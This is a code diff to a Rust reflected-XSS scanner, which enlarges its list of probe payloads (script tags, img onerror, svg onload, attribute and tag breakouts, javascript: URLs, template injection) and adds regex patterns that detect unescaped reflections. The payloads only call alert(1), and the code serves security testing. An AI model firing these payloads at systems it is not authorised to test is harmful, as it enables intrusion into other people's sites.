@@ -267,63 +267,175 @@ impl ReflectionXssScanner {
                 "html",
                 "Script tag injection",
             ),
-            // HTML context - img tag with onerror
             (
-                "<img src=x onerror=alert('XSS')>".to_string(),
+                "<script>alert(1)</script>".to_string(),
+                "html",
+                "Script tag injection (numeric)",
+            ),
+            // HTML context - img tag with onerror (CRITICAL: most common XSS vector)
+            (
+                "<img src=x onerror=alert(1)>".to_string(),
                 "html",
                 "IMG tag onerror handler",
             ),
+            (
+                "<img src=x onerror=alert('XSS')>".to_string(),
+                "html",
+                "IMG tag onerror handler (string)",
+            ),
             // HTML context - svg tag
             (
-                "<svg onload=alert('XSS')>".to_string(),
+                "<svg onload=alert(1)>".to_string(),
                 "html",
                 "SVG onload handler",
             ),
-            // Attribute context - breaking out of quotes
             (
-                "\" onmouseover=\"alert('XSS')".to_string(),
-                "attribute",
-                "Attribute breakout (double quote)",
+                "<svg/onload=alert(1)>".to_string(),
+                "html",
+                "SVG onload handler (no space)",
+            ),
+            // CRITICAL: Attribute breakout + tag injection (MOST COMMON REAL-WORLD XSS)
+            (
+                "\"><img src=x onerror=alert(1)>".to_string(),
+                "html",
+                "Attribute breakout + IMG onerror (double quote)",
             ),
             (
-                "' onmouseover='alert('XSS')".to_string(),
+                "'><img src=x onerror=alert(1)>".to_string(),
+                "html",
+                "Attribute breakout + IMG onerror (single quote)",
+            ),
+            (
+                "><img src=x onerror=alert(1)>".to_string(),
+                "html",
+                "Attribute breakout + IMG onerror (unquoted)",
+            ),
+            (
+                "\"><svg onload=alert(1)>".to_string(),
+                "html",
+                "Attribute breakout + SVG onload (double quote)",
+            ),
+            (
+                "'><svg onload=alert(1)>".to_string(),
+                "html",
+                "Attribute breakout + SVG onload (single quote)",
+            ),
+            (
+                "\"><script>alert(1)</script>".to_string(),
+                "html",
+                "Attribute breakout + script tag (double quote)",
+            ),
+            (
+                "'><script>alert(1)</script>".to_string(),
+                "html",
+                "Attribute breakout + script tag (single quote)",
+            ),
+            // Attribute context - breaking out and adding event handlers
+            (
+                "\" onmouseover=\"alert(1)".to_string(),
                 "attribute",
-                "Attribute breakout (single quote)",
+                "Attribute breakout event handler (double quote)",
+            ),
+            (
+                "' onmouseover='alert(1)".to_string(),
+                "attribute",
+                "Attribute breakout event handler (single quote)",
+            ),
+            (
+                "\" onfocus=\"alert(1)\" autofocus=\"".to_string(),
+                "attribute",
+                "Attribute breakout onfocus + autofocus",
+            ),
+            (
+                "\" onerror=\"alert(1)\" src=\"x".to_string(),
+                "attribute",
+                "Attribute breakout onerror",
             ),
             // JavaScript context
             (
-                "';alert('XSS');//".to_string(),
+                "';alert(1);//".to_string(),
                 "javascript",
-                "JavaScript string breakout",
+                "JavaScript string breakout (single quote)",
             ),
             (
-                "\";alert('XSS');//".to_string(),
+                "\";alert(1);//".to_string(),
                 "javascript",
                 "JavaScript string breakout (double quote)",
             ),
-            // Event handler injection
             (
-                "<body onload=alert('XSS')>".to_string(),
+                "</script><script>alert(1)</script>".to_string(),
+                "javascript",
+                "Script tag breakout",
+            ),
+            // Event handler injection with common tags
+            (
+                "<body onload=alert(1)>".to_string(),
                 "html",
                 "Body onload handler",
             ),
-            // Input with autofocus
             (
-                "<input autofocus onfocus=alert('XSS')>".to_string(),
+                "<input autofocus onfocus=alert(1)>".to_string(),
                 "html",
                 "Input autofocus onfocus",
             ),
+            (
+                "<details open ontoggle=alert(1)>".to_string(),
+                "html",
+                "Details ontoggle handler",
+            ),
+            (
+                "<video src=x onerror=alert(1)>".to_string(),
+                "html",
+                "Video onerror handler",
+            ),
+            (
+                "<audio src=x onerror=alert(1)>".to_string(),
+                "html",
+                "Audio onerror handler",
+            ),
             // Anchor tag with javascript
             (
-                "<a href=\"javascript:alert('XSS')\">click</a>".to_string(),
+                "<a href=\"javascript:alert(1)\">click</a>".to_string(),
                 "html",
                 "JavaScript URL in anchor",
+            ),
+            (
+                "<a href=javascript:alert(1)>click</a>".to_string(),
+                "html",
+                "JavaScript URL in anchor (unquoted)",
+            ),
+            // Form/iframe injection
+            (
+                "<iframe src=\"javascript:alert(1)\">".to_string(),
+                "html",
+                "Iframe javascript src",
             ),
             // Template injection that could lead to XSS
             (
                 "{{constructor.constructor('alert(1)')()}}".to_string(),
                 "template",
                 "Template expression injection",
+            ),
+            (
+                "${alert(1)}".to_string(),
+                "template",
+                "Template literal injection",
+            ),
+            // Context tag breakout
+            (
+                "</title><script>alert(1)</script>".to_string(),
+                "html",
+                "Title tag breakout",
+            ),
+            (
+                "</textarea><script>alert(1)</script>".to_string(),
+                "html",
+                "Textarea tag breakout",
+            ),
+            (
+                "</style><script>alert(1)</script>".to_string(),
+                "html",
+                "Style tag breakout",
             ),
         ]
     }
@@ -386,43 +498,139 @@ impl ReflectionXssScanner {
 
     /// Check if reflected payload is in an executable context
     fn check_executable_context(&self, body: &str, payload: &str, expected_context: &str) -> (bool, Confidence) {
-        // Look for the payload in different contexts
+        let body_lower = body.to_lowercase();
+        let payload_lower = payload.to_lowercase();
+
+        // Check if payload is HTML-encoded (safe - not exploitable)
+        let has_html_encoding = body.contains("&lt;") || body.contains("&gt;") ||
+                                body.contains("&#60;") || body.contains("&#62;") ||
+                                body.contains("&#x3c;") || body.contains("&#x3e;");
+
+        // Check if our specific payload appears HTML-encoded
+        let payload_appears_encoded = {
+            let encoded_lt = payload_lower.contains("<") &&
+                            (body.contains(&payload_lower.replace("<", "&lt;")) ||
+                             body.contains(&payload_lower.replace("<", "&#60;")) ||
+                             body.contains(&payload_lower.replace("<", "&#x3c;")));
+            let encoded_gt = payload_lower.contains(">") &&
+                            (body.contains(&payload_lower.replace(">", "&gt;")) ||
+                             body.contains(&payload_lower.replace(">", "&#62;")) ||
+                             body.contains(&payload_lower.replace(">", "&#x3e;")));
+            encoded_lt || encoded_gt
+        };
+
+        // If the exact payload with < and > appears unencoded, it's likely exploitable
+        if payload_lower.contains("<") && payload_lower.contains(">") {
+            if body_lower.contains(&payload_lower) && !payload_appears_encoded {
+                // Check for common XSS patterns in the reflected content
+
+                // Check for injected script tags
+                if payload_lower.contains("<script") && body_lower.contains("<script") {
+                    if !body.contains("&lt;script") && !body.contains("&#60;script") {
+                        return (true, Confidence::High);
+                    }
+                }
+
+                // Check for img/svg/body/etc with event handlers (CRITICAL CHECK)
+                let dangerous_tag_patterns = [
+                    r"<img[^>]+onerror\s*=",
+                    r"<img[^>]+onload\s*=",
+                    r"<svg[^>]*onload\s*=",
+                    r"<svg/onload\s*=",
+                    r"<body[^>]+onload\s*=",
+                    r"<input[^>]+onfocus\s*=",
+                    r"<details[^>]+ontoggle\s*=",
+                    r"<video[^>]+onerror\s*=",
+                    r"<audio[^>]+onerror\s*=",
+                    r"<iframe[^>]+onload\s*=",
+                    r"<marquee[^>]+onstart\s*=",
+                    r"<object[^>]+onerror\s*=",
+                    r"<embed[^>]+onerror\s*=",
+                ];
+
+                for pattern in dangerous_tag_patterns {
+                    if let Ok(re) = Regex::new(pattern) {
+                        if re.is_match(&body_lower) {
+                            return (true, Confidence::High);
+                        }
+                    }
+                }
+            }
+        }
 
         // Check if it's inside a <script> tag
         let script_re = Regex::new(r"<script[^>]*>[\s\S]*?</script>").ok();
         if let Some(re) = script_re {
             for cap in re.find_iter(body) {
-                if cap.as_str().to_lowercase().contains(&payload.to_lowercase()) {
+                if cap.as_str().to_lowercase().contains(&payload_lower) {
                     return (true, Confidence::High);
                 }
             }
         }
 
         // Check if we injected our own script tag
-        if payload.contains("<script") && body.to_lowercase().contains(&payload.to_lowercase()) {
+        if payload_lower.contains("<script") && body_lower.contains(&payload_lower) {
             // Verify it's not HTML-encoded
-            if !body.contains("&lt;script") {
+            if !body.contains("&lt;script") && !body.contains("&#60;script") {
                 return (true, Confidence::High);
             }
         }
 
-        // Check for event handler injection (onload, onerror, onclick, etc.)
-        let event_re = Regex::new(r#"on\w+\s*=\s*['"]*[^'">\s]*alert"#).ok();
-        if let Some(re) = event_re {
-            if re.is_match(&body.to_lowercase()) {
-                return (true, Confidence::High);
+        // Check for event handler injection in attributes
+        // This catches: onclick=, onerror=, onload=, onfocus=, onmouseover=, etc.
+        // Followed by any JS expression (not just 'alert')
+        let event_patterns = [
+            r#"on\w+\s*=\s*['"]?[^'">\s]*(alert|confirm|prompt|eval|document\.|window\.|location)"#,
+            r#"on\w+\s*=\s*['"]?\s*\w+\s*\("#,  // Matches: onerror=alert( or onerror="alert(
+            r#"on(error|load|click|focus|mouseover|mouseenter|input|change|submit|toggle)\s*="#,
+        ];
+
+        for pattern in event_patterns {
+            if let Ok(re) = Regex::new(pattern) {
+                if re.is_match(&body_lower) {
+                    // Additional check: ensure it's not just pre-existing event handlers
+                    // by checking if our payload characters are nearby
+                    if body_lower.contains(&payload_lower) ||
+                       (payload_lower.len() > 10 && body_lower.contains(&payload_lower[..10])) {
+                        return (true, Confidence::High);
+                    }
+                }
             }
         }
 
         // Check for javascript: URL
-        if payload.contains("javascript:") && body.to_lowercase().contains("javascript:") {
+        if payload_lower.contains("javascript:") && body_lower.contains("javascript:") {
             if !body.contains("&quot;javascript:") && !body.contains("&#") {
+                // Verify the javascript: URL contains our payload
+                if body_lower.contains(&payload_lower) {
+                    return (true, Confidence::High);
+                }
                 return (true, Confidence::Medium);
             }
         }
 
+        // Check for SVG with script or event handlers
+        if body_lower.contains("<svg") &&
+           (body_lower.contains("onload=") || body_lower.contains("<script")) {
+            if body_lower.contains(&payload_lower) {
+                return (true, Confidence::High);
+            }
+        }
+
         // Check if payload is reflected but might be encoded
-        if body.to_lowercase().contains(&payload.to_lowercase()) {
+        if body_lower.contains(&payload_lower) {
+            // Check if it's in an attribute context that could be dangerous
+            // e.g., the payload broke out of an attribute
+            if payload_lower.starts_with("\"") || payload_lower.starts_with("'") ||
+               payload_lower.starts_with(">") {
+                // Attribute breakout payloads - check if they're actually breaking out
+                if payload_lower.contains("onerror") || payload_lower.contains("onload") ||
+                   payload_lower.contains("onclick") || payload_lower.contains("onfocus") ||
+                   payload_lower.contains("<script") || payload_lower.contains("<img") ||
+                   payload_lower.contains("<svg") {
+                    return (true, Confidence::Medium);
+                }
+            }
             // Lower confidence if we can't confirm execution context
             return (true, Confidence::Low);
         }
